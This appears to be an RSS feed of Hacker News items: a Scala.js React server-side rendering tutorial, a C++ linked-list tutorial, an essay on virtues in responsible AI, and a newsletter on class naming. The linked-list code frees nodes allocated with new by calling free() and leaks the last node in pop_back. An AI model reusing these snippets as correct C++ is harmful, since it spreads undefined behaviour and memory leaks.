The pages/SPAs can (and should) live in their own SBT modules. Every time you want to equip a new component
with SSR, you simply add it’s module to the <code>.dependsOn(…)</code> list above.</p></blockquote><h2>Step 3/5: Prepare the SSR JS</h2><p>Firstly we’ll create a little API in <code>webapp-ssr/shared/src/main/scala</code>,
to be shared between the JVM &amp; JS modules. This will serve as the contract and protocol between both worlds.</p><div data-language="scala"><pre><code><span>import</span> <span>boopickle<span>.</span></span>Default<span>.</span>_

<span>object</span> SsrSharedData <span>{</span>

  <span>object</span> Manifest <span>{</span>
    <span>final</span> <span>val</span> MySpa <span>=</span> <span>"mySpa"</span>
  <span>}</span>

  <span>final</span> <span>case</span> <span>class</span> MySpaInputs<span>(</span>name<span>:</span> <span>String</span><span>,</span> age<span>:</span> <span>Int</span><span>)</span>

  <span>implicit</span> <span>val</span> picklerMySpaInputs<span>:</span> Pickler<span>[</span>MySpaInputs<span>]</span> <span>=</span>
    generatePickler<span>[</span>MySpaInputs<span>]</span>
<span>}</span></code></pre></div><p>Here we’re doing three things.</p><ol><li><p>With <code>SsrSharedData.Manifest.MySpa</code>, we’re declaring the name of the JS function that we’ll soon export.
Its value can be anything so long as it’s unique and doesn’t conflict with anything
available in the global JS environment.
(It has to be a <code>final val</code> so that it can be used in annotations.
This is equivalent to the much-clearer <code>inline val</code> in Scala 3.)</p></li><li><p>We declare a <code>MySpaInputs</code> class to contain all the inputs/args/props to our React component.</p></li><li><p>We declare an implicit <code>Pickler[MySpaInputs]</code> instance so that we can serialise the data
we need to send from the JVM to JS.</p></li></ol><p>You might wonder why I’m creating a <code>Manifest</code> object with only one constant. Seems a bit wasteful.
It’s because you might have more than just one page you want to equip with SSR, in which case you would
add a new entry to manifest, and (optionally) a new input class &amp; pickler.</p><p>Next, let’s expose the component we want to serve with SSR.
Create the following in <code>webapp-ssr/js/src/main/scala</code>:</p><div data-language="scala"><pre><code><span>import</span> <span>japgolly<span>.</span>scalagraal<span>.</span></span>Pickled
<span>import</span> <span>japgolly<span>.</span>scalajs<span>.</span>react<span>.</span></span>ReactDOMServer
<span>import</span> <span>scala<span>.</span>scalajs<span>.</span>js<span>.</span>annotation<span>.</span></span>JSExportTopLevel


<span>object</span> SsrJs <span>{</span>
  <span>import</span> SsrSharedData<span>.</span>_

  <span>@JSExportTopLevel</span><span>(</span>Manifest<span>.</span>MySpa<span>)</span>
  <span>def</span> mySpa<span>(</span>p<span>:</span> Pickled<span>[</span>MySpaInputs<span>]</span><span>)</span><span>:</span> <span>String</span> <span>=</span> <span>{</span>
    <span>val</span> input <span>=</span> p<span>.</span>value 
    <span>val</span> vdom <span>=</span> MyComponent<span>(</span>input<span>)</span> 
    ReactDOMServer<span>.</span>renderToString<span>(</span>vdom<span>)</span>
  <span>}</span>
<span>}</span></code></pre></div><p>I believe this is self-explanatory.
We take serialised input, deserialise it, pass it to our component, then
get React to render it to a string. The resulting string is the HTML that we’ll
soon serve to users.</p><h2>Step 4/5: Hydrate yourself</h2><p>When the frontend loads, it mounts itself into the DOM.
You’ll need to now change this to “hydrate” the DOM that you rendered on the backend
and sent as part of the page HTML. Change it as follows:</p><div data-language="diff"><pre><code><span><span> </span><span>  def main(args: Array[String]): Unit = {
</span><span> </span><span>    val container = dom.document.getElementById("root")
</span><span> </span><span>    val myPage = MyPageComponent(…)
</span></span><span><span>-</span><span>    myPage.renderIntoDOM(container)
</span></span><span><span>+</span><span>    ReactDOM.hydrateOrRender(myPage, container)
</span></span><span><span> </span><span>  }</span></span></code></pre></div><p>We could’ve used <code>ReactDOM.hydrate</code> directly but I prefer to use <code>ReactDOM.hydrateOrRender</code>
because we can set it once and forget about it, regardless of whether we decide to
server-side-render it, or not. Otherwise, you’d have a code dependency where you’d have to keep
the frontend code in sync (by choosing either <code>render</code> or <code>hydrate</code>) with whatever the
backend code does.</p><p>It also allows you to make SSR conditional at runtime.
An example use case for this (which <a href="https://github.com/japgolly/scala-graal" target="_blank" rel="noopener">scala-graal</a> has support for doing easily),
is to set a time limit for each server-side-render, and let the page render
without SSR if the backend cant render the page fast enough. In such a case the frontend <em>must</em>
use <code>ReactDOM.hydrateOrRender</code> as it doesn’t know ahead of time what the server’s going to do.</p><h2>Step 5/5: SSR in the JVM</h2><p>The final step. Here we’ll execute JS and React in the JVM.</p><p>We’ve already got our <a href="https://www.scala-js.org/" target="_blank" rel="noopener">Scala.JS</a> output file on our classpath; we did that in step 2
by configuring SBT. You’ll also need React itself on your classpath.
The quickest way is to just download React JS and dump it into your <code>webapp-ssr/jvm/src/main/resources</code> directory.
That’s not the optimal way.
The optimal way is quite open-ended and should align with other ways you’re managing JS dependencies in your project,
so I’ll leave that that as an exercise to the reader.
<em>(In my case, I have a webpack build outside of SBT that manages all of my JS, and I have symlinks in SBT to its output.)</em></p><p>Let’s start by creating a file in <code>webapp-ssr/jvm/src/main/scala</code>:</p><div data-language="scala"><pre><code><span>import</span> <span>japgolly<span>.</span>scalagraal<span>.</span></span>_
<span>import</span> <span>japgolly<span>.</span>scalagraal<span>.</span>js<span>.</span></span>_

<span>object</span> MySsr <span>{</span>
  <span>import</span> GraalBoopickle<span>.</span>_
  <span>import</span> GraalJs<span>.</span>_
  <span>import</span> SsrSharedData<span>.</span>_

  <span>val</span> setup<span>:</span> Expr<span>[</span><span>Unit</span><span>]</span> <span>=</span>
    ReactSsr<span>.</span>Setup<span>(</span>
      Expr<span>.</span>requireFileOnClasspath<span>(</span><span>"react.production.min.js"</span><span>)</span><span>,</span>
      Expr<span>.</span>requireFileOnClasspath<span>(</span><span>"react-dom-server.browser.production.min.js"</span><span>)</span><span>,</span>
    <span>)</span> <span>&gt;&gt;</span> Expr<span>.</span>requireFileOnClasspath<span>(</span><span>"webapp-ssr.…</span></code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.shipreq.com/post/scala_react_and_ssr_part_1">https://blog.shipreq.com/post/scala_react_and_ssr_part_1</a></em></p>]]>
            </description>
            <link>https://blog.shipreq.com/post/scala_react_and_ssr_part_1</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242073</guid>
            <pubDate>Sat, 22 Aug 2020 06:16:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linked List Operations – Traverse, Insert and Delete]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24242054">thread link</a>) | @Eyssant
<br/>
August 21, 2020 | https://www.alphacodingskills.com/ds/linked-list-operations.php | <a href="https://web.archive.org/web/*/https://www.alphacodingskills.com/ds/linked-list-operations.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 


 
 

<!-- blank -->






<!-- <script>
function myFunction(x) {
  var y = document.getElementById("ad_top");
  if (x.matches) { // If media query matches
    y.style.backgroundColor = "yellow";
  } else {
   y.style.backgroundColor = "pink";
  }
}

var x = window.matchMedia("(max-width: 1500px)")
myFunction(x) // Call listener function at run time
x.addListener(myFunction) // Attach listener function on state changes
</script> --><hr>
<p><a href="https://www.alphacodingskills.com/ds/linked-list.php">Previous Page</a>
<a href="https://www.alphacodingskills.com/ds/circular-singly-linked-list.php" role="button">Next Page</a></p><hr>

<p>In the <a href="https://www.alphacodingskills.com/ds/linked-list.php">previous section</a>, we had discussed about structure of linked list. In this section, we will learn about basic operations of a linked list.</p>

<h2>Traverse a Linked List</h2>
<p>Traversing through a linked list is very easy. It requires creating a temp node pointing to the head of the list. If the temp node is not null, display its content and move to the next node using temp next. Repeat the process till the temp node becomes null. If the temp node is empty at the start, then the list contains no item.</p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Display the content of the list
void PrintList() {
  
  //1. create a temp node pointing to head
  Node* temp = head;
  
  //2. if the temp node is not null continue 
  //   displaying the content and move to the 
  //   next node till the temp becomes null
  if(temp != NULL) {
    cout&lt;&lt;"\nThe list contains: ";
    while(temp != NULL) {
      cout&lt;&lt;temp-&gt;data&lt;&lt;" ";
      temp = temp-&gt;next;
    }
  } else {
    
    //3. If the temp node is null at the start, 
    //   the list is empty
    cout&lt;&lt;"\nThe list is empty.";
  }
} 
</pre>
</div>

<br>
<h2>Insert a new node in Linked List</h2>
<p>A new node can be inserted into a list in three ways:</p>
<ul>
  <li>Insert a node at the start</li>
  <li>Insert a node at the given position</li>
  <li>Insert a node at the end</li>
</ul>
<h3>Insert a new node at the start</h3>
<p>In this method, a new node is inserted at the beginning of the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at the start, the list becomes 100-&gt;10-&gt;20-&gt;30.</p>

<p>Inserting a new node at the beginning of the Linked List is very easy. First, a new node with given element is created. It is then added before the head of the given list that makes the newly added node to new head of the list by changing the head pointer to point to the new node.  </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   --> 
<pre>//C++ Code
//Inserts a new node at the start 
void push_front(int newElement) {
  
  //1. allocate a new node
  Node* newNode = new Node();
  
  //2. assign data element 
  newNode-&gt;data = newElement;
  
  //3. make next node of new node as head
  newNode-&gt;next = head;
  
  //4. make new node as head 
  head = newNode;   
}
</pre>
</div>


<br>
<h3>Insert a new node at the given position</h3>
<p>In this method, a new element is inserted at the specified position in the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at position 2, the list becomes 10-&gt;100-&gt;20-&gt;30.</p>
<p>First, a new node with given element is created. If the insert position is 1, then the new node is made to head. Otherwise, traverse to the node that is previous to the insert position and check if it is null or not. In case of null, the specified position does not exist. In other case, assign next of the new node as next of the previous node and next of previous node as new node.</p>


<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Inserts a new node at the given position
void push_at(int newElement, int position) {
  
  //1. allocate node to new element
  Node* newNode = new Node(); 
  newNode-&gt;data = newElement;
  newNode-&gt;next = NULL;

  //2. check if the position is &gt; 0
  if(position &lt; 1) {
    cout&lt;&lt;"\nposition should be &gt;= 1.";
  } else if (position == 1) {
  
  //3. if the position is 1, make next of the
  //   new node as head and new node as head
    newNode-&gt;next = head;
    head = newNode;
  } else {

   //4. Else, make a temp node and traverse to the 
   //   node previous to the position
    Node* temp = head;
    for(int i = 1; i &lt; position-1; i++) {
      if(temp != NULL) {
        temp = temp-&gt;next;
      }
    }
 
    //5. If the previous node is not null, make 
    //   newNode next as temp next and temp next 
    //   as newNode.
    if(temp != NULL) {
      newNode-&gt;next = temp-&gt;next;
      temp-&gt;next = newNode;  
    } else {
      
      //6. When the previous node is null
      cout&lt;&lt;"\nThe previous node is null.";
    } 
  }
}
</pre>
</div>

<br>
<h3>Insert a new node at the end</h3>
<p>In this method, a new node is inserted at the end of the linked list. For example - if the given list is 10-&gt;20-&gt;30 and a new element 100 is added at the end, the list becomes 10-&gt;20-&gt;30-&gt;100. </p>

<p>Inserting a new node at the end of the Linked List is very easy. First, a new node with given element is created. It is then added at the end of the list by linking the last node to the new node. </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Inserts a new node at the end
void push_back(int newElement) {
  
  //1. allocate node
  Node* newNode = new Node();
  
  //2. assign data element
  newNode-&gt;data = newElement;
  
  //3. assign null to the next of new node
  newNode-&gt;next = NULL; 
  
  //4. Check the list is empty or not,
  //   if empty make the new node as head 
  if(head == NULL) {
    head = newNode;
  } else {
    
    //5. Else, traverse to the last node
    Node* temp = head;
    while(temp-&gt;next != NULL)
      temp = temp-&gt;next;
    
    //6. Change the next of last node to new node
    temp-&gt;next = newNode;
  }    
}
</pre>
</div>

<br>
<h2>Delete a Node from Linked List</h2>
<p>A node can be deleted from a list in three ways:</p>
<ul>
  <li>Delete the first node</li>
  <li>Delete the node at given position</li>
  <li>Delete the last node</li>
</ul>
<h3>Delete the first node</h3>
<p>In this method, the first node of the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30-&gt;40 and the first node is deleted, the list becomes 20-&gt;30-&gt;40.</p>

<p>Deleting the first node of the linked list is very easy. If the head is not null then create a temp node pointing to head and move head to the next of head. Then delete the temp node. </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->     
<pre>//C++ Code
//Deletes the first node
void pop_front() {
  if(head != NULL) {
    
    //1. if head is not null, create a
    //   temp node pointing to head
    Node* temp = head;

    //2. move head to next of head
    head = head-&gt;next; 

    //3. delete temp node
    free(temp); 
  }
}
</pre>
</div>

<br>
<h3>Delete a node from middle</h3>
<p>In this method, a node at the specified position in the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30 and the 2<sup>nd</sup> node is deleted, the list becomes 10-&gt;20.</p>
<p>First, the specified position must be greater than equal to 1. If the specified position is 1 and head is not null, then make the head to head next. Else, traverse to the node that is previous to the specified position. If the specified node and previous to the specified node are not null then adjust the link and delete the node at specified position. In other case, the specified node will be already null.</p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->    
<pre>//C++ Code
//Deletes the node at given position
void pop_at(int position) {     
  
  //1. check if the position is &gt; 0
  if(position &lt; 1) {
    cout&lt;&lt;"\nposition should be &gt;= 1.";
  } else if (position == 1 &amp;&amp; head != NULL) {
      
    //2. if the position is 1 and head is not null,
    //   make head to head next and delete the 
    //   previous head
    Node* nodeToDelete = head;
    head = head-&gt;next;
    free(nodeToDelete);
  } else {
    
    //3. Else, make a temp node and traverse to the 
    //   node previous to the position
    Node* temp = head;
    for(int i = 1; i &lt; position-1; i++) {
      if(temp != NULL) {
        temp = temp-&gt;next;
      }
    }
 
    //4. If the previous node and next of the previous  
    //   is not null, adjust links 
    if(temp != NULL &amp;&amp; temp-&gt;next != NULL) {
        Node* nodeToDelete = temp-&gt;next;
        temp-&gt;next = temp-&gt;next-&gt;next;
        free(nodeToDelete); 
    } else {

      //5. Else the given node will be empty.
      cout&lt;&lt;"\nThe node is already null.";
    }       
  }
} 
</pre>
</div>

<br>
<h3>Delete the last node</h3>
<p>In this method, the last node of the linked list is deleted. For example - if the given list is 10-&gt;20-&gt;30-&gt;40 and the last node is deleted, the list becomes 10-&gt;20-&gt;30.</p>
<p>Deleting the last node of the Linked List involves checking the head for empty. If it is not empty, then check the head next for empty. If the head next is empty, then release the head, else traverse to the second last node of the list. Then, link the next of second last node to NULL and delete the last node.  </p>

<div> 
<!--   <div class="titlebox"><i class="fa fa-pencil fa-pencil-style"></i></div><p></p>   -->  
<pre>//C++ Code
//Deletes the last node
void pop_back() {
  if(head != NULL) {
    
    //1. if head in not null and next of head
    //   is null, release the head
    if(head-&gt;next == NULL) {
      head = NULL;
    } else {
      
      //2. Else, traverse to the second last 
      //   element of the list
      Node* temp = head;
      while(temp-&gt;next-&gt;next != NULL)
        temp = temp-&gt;next;
      
      //3. Change the next of the second 
      //   last node to null and delete the
      //   last node
      Node* lastNode = temp-&gt;next;
      temp-&gt;next = NULL; 
      free(lastNode);
    }
  }
}
</pre>
</div>



<hr>
<p><a href="https://www.alphacodingskills.com/ds/linked-list.php">Previous Page</a>
<a href="https://www.alphacodingskills.com/ds/circular-singly-linked-list.php" role="button">Next Page</a></p><hr>


<!-- 2nd column end -->
</div></div>]]>
            </description>
            <link>https://www.alphacodingskills.com/ds/linked-list-operations.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-24242054</guid>
            <pubDate>Sat, 22 Aug 2020 06:12:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Virtues Not Principles]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24241964">thread link</a>) | @atg_abhishek
<br/>
August 21, 2020 | https://montrealethics.ai/virtues-not-principles/ | <a href="https://web.archive.org/web/*/https://montrealethics.ai/virtues-not-principles/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">




<p>There has been a recent explosion of interest in the field of <a href="https://montrealethics.ai/the-state-of-ai-ethics-report-june-2020/">Responsible Artificial Intelligence</a> (aka AI Ethics). It is well understood that AI is having (and will continue to have) significant social implications as the technology currently exists. Concerns over bias, fairness, privacy, and labour market impacts do not require the arrival of some mythical Artificial General Intelligence (AGI) to be socially destructive. Organisations from around the world are <a href="https://arxiv.org/ftp/arxiv/papers/1906/1906.11668.pdf">publishing frameworks</a> for the ethical development and deployment of AI, corporations are affirming their commitment to social responsibility by funding responsible AI research and creating review boards, and a political interest in AI has led to state guidelines from <a href="https://oecd.ai/countries-and-initiatives">numerous countries</a>. Despite this, to many observers, little feels to have changed. Algorithms with suspected bias continue to be used, privacy continues to be a major concern, and accountability is near non-existent.</p>



<p>The failure of progress in responsible AI stems from a mistaken approach which prioritises good outcomes over good behaviour. It is uncontroversial to say that bias is bad and that privacy is good, but what this means in practice is more contentious. By attempting to simplify the work of achieving good outcomes to “frameworks” or “principles” the work being done in the field risks bearing little fruit. Our understanding of how AI systems can lead to problematic social outcomes is inherently reactive, in that we respond to problems that can be documented. The goal of responsible AI, however, is to be proactive by anticipating potential harms and mitigating their impact. Checklists on what ought to be done can never achieve the full range of potential risks that responsible AI seeks to address, and as a result are inherently limited. Proactive concern with socially beneficial outcomes requires not just work on frameworks for ethical use, but the cultivation of virtuous technologists and managers, who are motivated to take the concerns of responsible AI seriously.</p>



<p>The importance of virtue is clear when we consider the failure modes of principles-driven approaches to Responsible AI: non-adoption and recuperation. Either principles will be ignored, or they will be contorted to serve the interests of the status quo.</p>



<p>The risk of non-adoption is currently the more pervasive problem facing responsible AI work. In the rush to develop principles and guidelines competing approaches fail to generate consensus, and as a result have low impetus for adoption. Where a set of guidelines have low implementation costs, they may be championed to little or no effect. Where the burden of principles is too high, nobody cares to use them. If work is too technically focussed, it’s hard to communicate what has been achieved. If work is too value driven, it’s hard to audit whether anything has been done and it has limited practical applicability.</p>



<p>Even if consensus were to exist and the ideal set of principles formulated, this would not in and of itself motivate adoption. A lot of work has gone into consensus building among ethicists and commoditising the various implementations of responsible AI tools such as differential privacy, but this alone does not make technologists or business leaders care. Regulatory approaches seek to create the right incentives for following ethical guidelines by penalising bad behaviour, but these run into huge cost barriers to enforce and are slow to develop and diffuse. Even if ideal enforcement mechanisms were discovered, they would fail to create the proactive concern with social outcomes that responsible AI practitioners desire. <a href="https://www.amazon.ca/Moral-Economy-Incentives-Substitute-Citizens/dp/0300163800">Good incentives are no substitute for good citizens</a>.</p>



<p>The degradation of responsibility and civic duty that incentive driven adoption creates leads to the second failure mode of current responsible AI approaches, recuperation. Recuperation is the risk of sincere work being co-opted by those who are in power. The common cries of “<a href="https://www.technologyreview.com/2019/12/27/57/ai-ethics-washing-time-to-act/">ethics washing</a>” and “<a href="https://www.vox.com/podcasts/2019/4/8/18299736/artificial-intelligence-ai-meredith-whittaker-kate-crawford-kara-swisher-decode-podcast-interview">ethics theatre</a>” that dominate high profile efforts by corporations to respond to the concerns of responsible AI practitioners reveal that without a sincere motivation to care, principles can be reduced to PR gimmicks. </p>



<p>Technical jargon can bury sincere conversations about social consequences, making it seem as if lots is being done. Review boards that hold <a href="https://www.theverge.com/interface/2020/1/30/21113273/facebook-oversight-board-jurisdiction-bylaws-restrictions">no actual power</a> over decisions become <a href="https://www.vox.com/future-perfect/2019/4/4/18295933/google-cancels-ai-ethics-board">poster children</a> for corporate efforts. Internal memos may normalise a certain sort of discourse around responsibility, with little to no actual understanding of the content. Regulatory compliance may become a way to capture markets by increasing barriers for new entrants. Even without the malice associated with naked self-interest, recuperation can result from laziness. If ethical concerns are reduced to checklists one simply has to tick off, the letter of the law may be followed, but its spirit completely lost. This would require the field of responsible AI to remain in constant vigilance to identify new risks and formulate new approaches for everyone to follow. In doing so, the law would get larger, but adherence would decline.</p>



<p>None of this is to say that work on principles is inherently useless, but rather that good behaviour relies on good people. Principles are put into place by people, and they embody the character of those who implement them. In order to achieve the goals of the responsible AI community, making people care about being good needs to be the primary goal. This requires a cultivation of virtue.</p>



<p>Dating back to Ancient Greece the concept of the <a href="https://plato.stanford.edu/entries/plato-ethics/">Cardinal Virtues</a> has been a pillar in moral philosophy as prerequisites for living a good life. A virtuous person is one capable of doing good, and they provide a bedrock upon which the internal motivation to do the right thing rests. Traditionally, the Cardinal Virtues are Prudence, Fortitude, Temperance, and Justice. By focussing on cultivating these virtues among the practitioners who develop and deploy AIs, from researchers to ML engineers to data scientists to project managers to executives, the responsible AI community would be more successful in ensuring proactive social concern. Each of these virtues is essential, and none on their own is sufficient to guarantee prosocial outcomes.</p>



<p>The first of these virtues is Prudence, which can be roughly equated to foresight or practical wisdom. It is probably the only virtue that is emphasised in education and work environments today. A prudent person is able to judge what the right thing to do is at the right time. The ability to make rational judgements about what one can best spend their time doing, what is the best use of the resources at their disposal, and whether a risk is worth taking are the fruits of prudence. </p>



<p>In the AI context, prudent practitioners are able to understand the consequences of what they are building, accurately describe the limits of their programs, and evaluate the opportunity costs of solving different problems using AI or solving a problem using AI rather than more conventional methods (such as human labour or rules-based programs). All of these decisions are critical for evaluating whether the outcomes of a system are socially beneficial or harmful, and the process by which this understanding comes about cannot be reduced to a checklist.</p>



<p>The next virtue is Fortitude, which can be equated with moral courage or perseverance. Fortitude enables one to do the right thing no matter the personal consequences or the stigma associated with a course of action. There are fields where fortitude is emphasised, such as in the military and in nuclear power management, where there is a pervasiveness of uncertainty and the consequences of error are disastrous. A lack of fortitude among AI practitioners poses many risks as without fortitude those who notice a problem may be afraid to speak up, the voice of one’s conscience may be drowned out by a desire to go with the flow or to protect one’s career, and doubt may confuse one’s ability to make effective judgements. Cultivating fortitude goes beyond the education of what the right thing to do is that currently grabs the attention of the responsible AI community by providing practitioners with the tools to act on the right thing.&nbsp;&nbsp;&nbsp;</p>



<p>Then there is Temperance, which can be equated with self-restraint or moderation. Plato himself considered this the most important of all the virtues as it enabled one to be humble and avoid acting rashly. Temperance enables people to understand their own failings and critically examine their own whys for acting. This virtue has played a foundational role in most of the world’s great religions and cultures, though its popular emphasis ebbs and flows. Organisations such as the Boy Scouts seek to cultivate this virtue, as do philosophy and meditation. The risks of intemperance for AI are severe as it would allow personal desires, for recognition or power or profit or even pure intellectual curiosity, to cloud judgement. Without temperance practitioners would be less willing to acknowledge their own biases and limitations, and as a result may refuse to acknowledge the harms that could be caused by what they develop.</p>



<p>Finally, there is Justice, which encompasses concepts of fairness and charity. The scales of justice in classical iconography sum up the balance between selfishness and selflessness that defines the just person. The golden rule that one ought to treat others as one ought to be treated cuts to the heart of just behaviour. The concerns of justice are front and centre in the work of most responsible AI researchers, as they seek to ensure that AIs do not discriminate against the disenfranchised and that diversity among practitioners provides representation to all voices. The risks of being unjust are evident and well understood, that the development of AIs will prioritise the people building it or people like them at the expense of the whole. Despite this understanding, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://montrealethics.ai/virtues-not-principles/">https://montrealethics.ai/virtues-not-principles/</a></em></p>]]>
            </description>
            <link>https://montrealethics.ai/virtues-not-principles/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24241964</guid>
            <pubDate>Sat, 22 Aug 2020 05:53:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't Name Classes After Patterns. Mostly]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 20 (<a href="https://news.ycombinator.com/item?id=24241886">thread link</a>) | @allending
<br/>
August 21, 2020 | https://sender.cloudy.email/campaigns/paxjhchaiasjoifsiw/webversion/jdnapfbdgjegdqmdeduwc | <a href="https://web.archive.org/web/*/https://sender.cloudy.email/campaigns/paxjhchaiasjoifsiw/webversion/jdnapfbdgjegdqmdeduwc">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="100%">
													<tbody>
														<tr>
															<td><!--[if mso]>
				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
				<tr>
				<![endif]--><!--[if mso]>
				<td valign="top" width="600" style="width:600px;">
				<![endif]-->
															<div>
																		<p>Good Morning/Afternoon/Evening as the case may be.</p>

																		<p>I've been hoping you are well, and thinking about naming.</p>

																		<p><em>Estimated reading time: 7 minutes, 37 seconds.</em></p>

																		<h2>A Small Digression</h2>

																		<p>You may have heard <a href="https://sender.cloudy.email/postal/click?link=92413&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=77-9fnIoX1Dvv73vv70yPi_vv70mcDh0Cu-_ve-_vQkuXWjvv71w0Zbvv70y77-977-977-9" target="_blank">Phil Karlton's famous saying</a>:</p>

																		<blockquote>
																		<p>There are only two hard things in Computer Science: cache invalidation and naming things.</p>
																		</blockquote>

																		<p>I first heard this as 'There are only two hard things in Computer Science: cache invalidation, naming things, and off-by-one errors.'</p>

																		<p>I passed this phrase on for many years before realizing that the 'off-by-one errors' bit was a joke.</p>

																		<p>Truth.</p>

																		<p>I am so literal that it pains me. I confess this in case it's paining you too. Puns, for example, fly right over my head, and any that I make are most likely inadvertent. I don't believe that there are any puns in the text that follows—but how would I know?</p>

																		<h2>Thoughts on Using Pattern Names in Class Names</h2>

																		<p>I've always heard that it's best to avoid using pattern names in class names. As one so often does, I've cargo-culted this rule without truly examining it. I habitually obey it myself, and teach it to folks in my OOD classes, but until recently I couldn't have articulated a convincing defense.</p>

																		<p>But then, while writing the 2nd Edition of 99 Bottles of OOP, I broke it. I created a new class whose name included the name of a pattern. I did this because it just felt right.</p>

																		<p>This put me in a pickle.</p>

																		<p>I very much believe in being guided by feelings about code, but when writing a book one can't just say, 'Okay, now do this because I, the author, <em>feel</em> like you should'. Respect for the reader requires investing sincere effort into dragging feelings about code into the light of day, and at least <em>trying</em> to justify them with convincing words.</p>

																		<p>Below I've included the excerpt from the book where I attempt just such convincing. The excerpt explains the purpose of the no-pattern-names-in-class-names rule and defends its utility.</p>

																		<p>I've built a newsletter around this rule not only because I believe that it's useful, but also because my initial attempts to explain it exposed deep holes in my understanding. This was a revelation. Had I not been writing a book, I might have hand-waved around these gaps in my knowledge forever.</p>

																		<h3>Some Context</h3>

																		<p>Before moving on to the excerpt, here's a bit of context to orient you. At this point in the book:</p>

																		<ul>
																			<li>
																			<p>The code contains a <code>CountdownSong</code> class that gets injected with a player of the <code>verse template</code> role.</p>
																			</li>
																			<li>
																			<p><code>BottleVerse</code> is the only class that plays this role. It's used as the default <code>verse template</code> in <code>CountdownSong</code>.</p>
																			</li>
																		</ul>

																		<p>So, <code>CountdownSong</code> has-a <code>verse template</code>, whose concrete implementation is supplied by <code>BottleVerse</code>.</p>

																		<ul>
																			<li>
																			<p>I'm writing tests for <code>CountdownSong</code>, and have just decided to create a new player of the <code>verse template</code> role to inject for use during these tests.</p>
																			</li>
																			<li>
																			<p>I've named this new class <code>VerseFake</code>.</p>
																			</li>
																		</ul>

																		<p>The excerpt below also mentions a <code>BottleNumber</code> class. This class wraps a number to add bottle-ish behavior.</p>

																		<h3>The Excerpt</h3>

																		<p>With that, here's a bit of chapter 9:</p>

																		<blockquote>
																		<p><em>The <code>VerseFake</code> class above is perfect for your needs, though it must be acknowledged that it unrepentantly breaks several common programming rules.</em></p>

																		<p><em>First, Chapter 8 suggested that you put domain behavior on instances. This class violates that rule; its behavior is on the class/static side.</em></p>

																		<p><em>Next, there's an as-yet-unmentioned object-oriented programming rule that prohibits the use of pattern names in class names. The word "Fake" above refers to a testing pattern, so naming this class <code>VerseFake</code> violates that rule.</em></p>

																		<p><em>Fake things first. You're probably familiar with the idea of design patterns, which are named, re-usable solutions to common software problems. Pattern names act as shortcuts to big ideas and allow programmers to communicate with speed and precision. Pattern thinking has so influenced software design that most programmers are familiar with a number of patterns. For example, you've likely heard of Decorator, Adapter, Enumerator, and so on, even if you're a bit fuzzy on the specifics of some of their definitions.</em></p>

																		<p><em>Since pattern names are so meaningful, it can be tempting to stick them in class names. For example, you might use the Decorator pattern to enclose a <code>number</code> in a new class that adds additional responsibility. Initially, <code>NumberDecorator</code> might seem like a good name for the result. The problem with including the name of a pattern in the name of a class is that this permits you the feeling of having created a useful name without actually having done so. Pattern names don't generally reflect concepts in your application. Appending them to class names pollutes your domain with programmer-y words and circumvents the search for names that add semantic meaning. Class names that include patterns are a signal that you've given up too soon on the hard problem of naming.</em></p>

																		<p><em>Class names should reflect concepts in your domain, not the patterns used to create them. Compared to <code>BottleNumber</code>, the much-richer name you gave this class in Chapter 4, <code>NumberDecorator</code> is so abstract as to be meaningless. Future readers won't care that the class was created using Decoration but they'll be grateful to know that it's a bottle-ish kind of number.</em></p>

																		<p><em>The <a href="https://sender.cloudy.email/postal/click?link=92414&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=77-9UAkI77-9RCbvv71EQBIUNO-_veaYlO-_vUwP77-91q7avFdOBO-_ve-_ve-_ve-_vQ==" target="_blank">xUnit Test Patterns</a> book by <a href="https://sender.cloudy.email/postal/click?link=92415&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=ND_vv70277-977-977-977-977-977-977-9Su-_ve-_ve-_vQFndu-_vWHvv70bZRAa77-9Hu-_vVFFGg==" target="_blank">Gerard Meszaros</a> standardizes the <a href="https://sender.cloudy.email/postal/click?link=92416&amp;sid=scljtfbdgjegdqjtgyrxa&amp;ck=77-9au-_ve-_ve-_vQRD77-9OkR077-9KO-_ve-_vQt077-9fhIK77-977-9P--_vSo0ee-_vQ3vv71v" target="_blank">pattern names</a> of a set of objects that are used to simplify testing. <code>TestDouble</code> is his generic name for all of the patterns. Within <code>TestDouble</code> he further delineates the <code>Dummy</code>, <code>Stub</code>, <code>Spy</code>, <code>Mock</code>, <code>Fake</code>, and <code>Temporary Test Stub</code> patterns.</em></p>

